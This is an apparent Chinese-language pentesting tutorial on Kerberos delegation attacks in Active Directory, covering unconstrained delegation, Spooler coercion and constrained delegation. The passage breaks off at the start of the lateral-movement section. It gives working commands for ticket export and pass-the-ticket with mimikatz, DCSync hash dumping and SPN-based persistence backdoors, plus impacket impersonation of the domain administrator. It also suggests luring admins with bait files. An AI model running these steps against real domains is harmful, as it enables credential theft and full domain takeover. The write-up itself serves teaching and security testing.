## 前言
本篇文章主要是对域渗透中的Kerberos委派攻击的利用手法进行简单的总结。  
( **可能思路狭隘，有缺有错，师傅们多带带** )  
域委派是指，将域内用户的权限委派给服务账号，使得服务账号能以用户权限开展域内活动。需要注意的是在域内可以委派的账户有两种，一种是 **主机账户**
，另一种是 **服务账户** (域用户通过注册SPN也可以成为服务账号)。  
Kerberos委派主要分为三种：
> **非约束委派(Unconstrained Delegation)**  
>  **约束委派(Constrained Delegation)**  
>  **基于资源的约束委派(Resource-Based Constrained Delegation)**
非约束委派和约束委派的流程，有兴趣的师傅可以去看看[微软的手册](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/1fb9caca-449f-4183-8f7a-1a5fc7e7290a
"微软的手册")。  
下面简单介绍下Kerberos的各类委派， **如何配置** ， **如何发现** ， **实战场景中如何利用** 。
## 非约束委派
### 概述
当域用户访问域内某服务时，如果该服务开启了非约束委派，用户会主动将自己已转发的的TGT发送服务，而该服务会将用户的TGT保存在内存以备下次重用，然后服务就可以利用该已转发的TGT以用户的身份访问该用户能访问的服务。非约束委派的安全问题就是如果我们找到配置了非约束委派的主机，并且通过一定手段拿下该主机的权限，我们就可以拿到所有访问过该主机用户的TGT。
### 如何配置和发现非约束委派的主机
配置：
查找：
    AdFind.exe -b "DC=0ne,DC=test" -f "(&(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))" cn distinguishedName
### 利用场景
#### 被动
当我们在域内拿到一台配置了非约束委派的主机后，就可以使用mimikatz导出所有票据，若是有其他用户访问过该主机，那么我们就可以通过ptt获取该用户权限。
    mimikatz.exe "privilege::debug" "sekurlsa::tickets /export" exit
    kerberos::ptt
    psexec64.exe \\DC2012.0ne.test -accepteula -s cmd
当然我们也可以诱导域管访问该主机，例如通过给管理员发诱饵文件修改Desktop.ini，或是outlook等等。详情可参考[daiker师傅的发起NTLM请求](https://daiker.gitbook.io/windows-protocol/ntlm-pian/5 "daiker师傅的发起NTLM请求")。
域管在域控上点击此文件夹是就会访问win7，导出域管的TGT，ptt，psexec域控。  
#### 非约束委派+Spooler打印机服务
在实战中，被动的非约束委派的利用需要和目标用户交互比较鸡肋。因此可以利用非约束委派+Spooler 打印机服务可以强制指定的主机进行连接。
利用原理：利用 Windows 打印系统远程协议 (MS-RPRN) 中的一种旧的但是默认启用的方法，在该方法中，域用户可以使用 MS-RPRN
RpcRemoteFindFirstPrinterChangeNotification(Ex) 方法强制任何运行了 Spooler 服务的计算机以通过
Kerberos 或 NTLM 对攻击者选择的目标进行身份验证。  
POC:   
在WIN7主机上运行该工具，强制域控向WIN7发起认证，然后导出票据，可以看到已经获取了DC2012$的TGT，符合DCSync的利用条件
**[域控制器计算机帐户]** ：
    kerberos::ptt xxxx.kirbi
    lsadump::dcsync /domain:0ne.test /all /csv
## 约束委派
### 概述
由于非约束委派的不安全性，微软在windows
server2003中引入了约束委派，对Kerberos协议进行了拓展，引入了S4U。其中S4U支持两个子协议：
  * Service for User to Self( **S4U2self** )
  * Service for User to Proxy( **S4U2proxy** )
这两个扩展都允许服务代表用户从KDC请求票证。S4U2self可以代表自身请求针对其自身的Kerberos服务票据(ST)；S4U2proxy可以以用户的名义请求其它服务的ST，约束委派就是限制了S4U2proxy扩展的范围。配置它后，约束委派将限制指定服务可以代表用户去访问服务。该设置需要`SeEnableDelegation`特权，该特权很敏感，通常仅授予域管理员。  
约束委派的安全问题就是如果我们找到配置了约束委派的服务账号，并且通过一定手段拿下该服务账号。我们就可以利用这个服务账号代表任意用户进行S4U2self获得一个可转发的票据，然后把获取到的票据用于S42proxy(作为AddtionTicket)，从而获取一个可转发的TGS，服务就可以代替任意用户访问另外一个服务(既被配置的约束委派的服务)。
### 如何配置和发现约束委派的服务
配置：
查找：
    AdFind.exe -b "DC=0ne,DC=test" -f "(&(samAccountType=805306368)(msds-allowedtodelegateto=*))" cn distinguishedName msds-allowedtodelegateto
也可以使用impacket工具包`findDelegation.py`找出所有的委派配置。
    findDelegation.py -dc-ip 192.168.17.134 -target-domain 0ne.test 0ne.test/zhangsan:zs@123456
### 利用场景
#### 后门
约束委派可以作为变种黄金票据，用作后门权限维持。  
给后门账户[知道密码或是hash就成]注册SPN:
    setspn -U -A variant/golden lisi
配置后门账户到域控的约束委派：  
使用impactet工具包中的getST.py[其他工具也成]，模拟域管理员administrator账号申请访问域控的ldap服务的ST。
    getST.py -dc-ip 192.168.17.134 -spn ldap/DC2012.0ne.test -impersonate administrator 0ne.test/lisi -hashes xxxxx:xxxxxx
ptt，然后wmiexec到域控获取权限，或是secretsdump后随时随地pth域控：
    export KRB5CCNAME=administrator.ccache
    klist
    wmiexec.py -dc-ip 192.168.17.134 -no-pass -k PI:EMAIL
    secretsdump.py -k -no-pass DC2012.0ne.test -just-dc-user administrator
    wmiexec.py  0ne/PI:EMAIL  -hashes xxxxx:xxxxxxx
#### 横向
打下配置了约束委派的服务账号，我们就可以拿下被配置的约束委派的服务(A->B)。  